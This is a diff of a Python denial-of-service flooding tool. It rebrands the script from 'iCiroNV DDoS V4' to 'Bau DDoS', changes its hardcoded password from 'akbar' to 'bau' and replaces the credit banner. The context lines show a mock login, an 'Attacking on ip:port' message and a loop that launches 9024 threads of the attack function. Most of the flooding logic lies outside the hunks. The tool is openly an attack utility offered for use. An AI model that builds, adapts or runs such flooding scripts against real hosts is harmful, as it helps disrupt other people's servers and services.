@@ -1,4 +1,4 @@
-#iCiroNV#
+#bau#
 import os, sys
 
 try:
@@ -16,13 +16,13 @@ import socket
 import threading
 import time
 import os
-os.system('color ' +random.choice(['a'])+ " & cls & title iCiroNV DDoS V4")
+os.system('color ' +random.choice(['a'])+ " & cls & title Bau DDoS")
 nama = input("\033[1;36;40m╭─Name \n└────")
 print("[//>]Searching " + nama + " in database...!")
 time.sleep(1.5)
 print("[//>]Success!\n\n")
 password = input("╭─Password \n└────")
-if password == "akbar" :
+if password == "bau" :
        print("[✓] Correct password.")
        time.sleep(1)
 else :
@@ -174,7 +174,7 @@ referers = [
 
 
 
-# iciroooooooooooo
+# bau
 if sys.platform.startswith("linux"):
    os.system('clear')
 elif sys.platform.startswith("freebsd"):
@@ -183,15 +183,10 @@ else:
    os.system('color ' +random.choice(['5'])+ " & cls & title iCiroNV DDoS V4 used by " + nama + "")
 credit = """
 
-\033[1;31;40m ██╗░█████╗░██╗██████╗░░█████╗░███╗░░██╗██╗░░░██╗
-██║██╔══██╗██║██╔══██╗██╔══██╗████╗░██║██║░░░██║
-██║██║░░╚═╝██║██████╔╝██║░░██║██╔██╗██║╚██╗░██╔╝
-██║██║░░██╗██║██╔══██╗██║░░██║██║╚████║░╚████╔╝░
-██║╚█████╔╝██║██║░░██║╚█████╔╝██║░╚███║░░╚██╔╝░░
-╚═╝░╚════╝░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░
+\033[1;31;40m
 \n╔═════════════════════════════╗
-║   Created by iCiroNV             ║
-║   Version : 4.1                  ║
+║   Created by Bau                 ║
+║   Version : 0.1                  ║
 ║   Dont leak!                     ║
 ╚═════════════════════════════╝\n"""
 
@@ -282,7 +277,7 @@ def run():
             print(i +" \033[5;37;40mAttacking...")
         except socket.error:
             s.close()
-            print("\033[1;37;40m[!]\033[1;36;40m iCiroNV \033[1;31;40m Attacking on \033[0;37;41m ",ip,":",port,"|↓|\033[0;37;40m")
+            print("\033[1;37;40m[!]\033[1;36;40m Bau \033[1;31;40m Attacking on \033[0;37;41m ",ip,":",port,"|↓|\033[0;37;40m")
 
 for y in range(9024):
     th = threading.Thread(target = run)
